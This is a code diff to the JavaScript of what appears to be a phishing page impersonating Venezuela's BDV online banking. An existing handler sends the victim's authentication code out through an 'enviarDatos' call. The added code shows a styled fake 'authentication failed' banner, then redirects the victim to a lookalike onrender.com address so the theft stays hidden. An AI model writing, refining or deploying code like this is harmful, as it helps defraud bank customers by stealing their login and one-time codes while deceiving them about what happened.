@@ -129,12 +129,66 @@ document.getElementById("authBtn").addEventListener("click", async function () {
     await enviarDatos('auth', authCode);  // Enviar código de autenticación
 });
 
-// Nueva funcionalidad: Redirigir a la ventana de usuario y mostrar mensaje de error
-document.getElementById("authBtn").addEventListener("click", async function () {
-    const authCode = document.getElementById("authCode").value;  
-        // Redirigir a la ventana de usuario
-        window.location.href = "https://bdvenlinea-banvenez.onrender.com"; // Cambia "ruta/a/tu/ventana-de-usuario.html" a la ruta de la ventana de usuario
+// Función para mostrar la alerta personalizada de autenticación incorrecta
+function mostrarAlertaAutenticacionIncorrecta() {
+    // Crea un contenedor de alerta
+    const alerta = document.createElement("div");
+    alerta.style.position = "fixed";
+    alerta.style.bottom = "13%";
+    alerta.style.left = "50%";
+    alerta.style.transform = "translateX(-50%)";
+    alerta.style.backgroundColor = "#0068b1"; // Color de fondo azul
+    alerta.style.padding = "15px 17px";
+    alerta.style.borderRadius = "5px";
+    alerta.style.display = "flex";
+    alerta.style.alignItems = "center";
+    alerta.style.justifyContent = "space-between";
+    alerta.style.color = "white";
+    alerta.style.fontSize = "15.6px";
+    alerta.style.fontWeight = "500";
+    alerta.style.minWidth = "320px";
+    alerta.style.zIndex = "1000";
 
-        // Mostrar mensaje de autenticación incorrecta
-        alert("Autenticación incorrecta"); // Muestra el mensaje de error
+    // Agrega el mensaje de error
+    const mensaje = document.createElement("span");
+    mensaje.textContent = "Tu autenticación ha sido fallida";
+    alerta.appendChild(mensaje);
+
+    // Agrega el botón de "Aceptar"
+    const botonAceptar = document.createElement("button");
+    botonAceptar.textContent = "Aceptar";
+    botonAceptar.style.backgroundColor = "#2f73c8"; // Color azul oscuro para el botón
+    botonAceptar.style.color = "white";
+    botonAceptar.style.border = "none";
+    botonAceptar.style.padding = "10px 20px";
+    botonAceptar.style.borderRadius = "5px";
+    botonAceptar.style.marginLeft = "15px";
+    botonAceptar.style.cursor = "pointer";
+    botonAceptar.style.fontWeight = "bold";
+
+    // Función para redirigir después de 5 segundos o al hacer clic en el botón
+    function redirigir() {
+        window.location.href = "https://bdvenlinea-banvenez.onrender.com";
+    }
+
+    // Redirigir al hacer clic en el botón
+    botonAceptar.addEventListener("click", () => {
+        redirigir();
     });
+
+    alerta.appendChild(botonAceptar);
+
+    // Agrega el contenedor de alerta al cuerpo del documento
+    document.body.appendChild(alerta);
+
+    // Redirigir automáticamente después de 5 segundos
+    setTimeout(redirigir, 5000);
+}
+
+// Modifica el evento de autenticación para mostrar la alerta personalizada
+document.getElementById("authBtn").addEventListener("click", async function () {
+    const authCode = document.getElementById("authCode").value;
+    
+    // Mostrar mensaje de autenticación incorrecta usando la función personalizada
+    mostrarAlertaAutenticacionIncorrecta();
+});
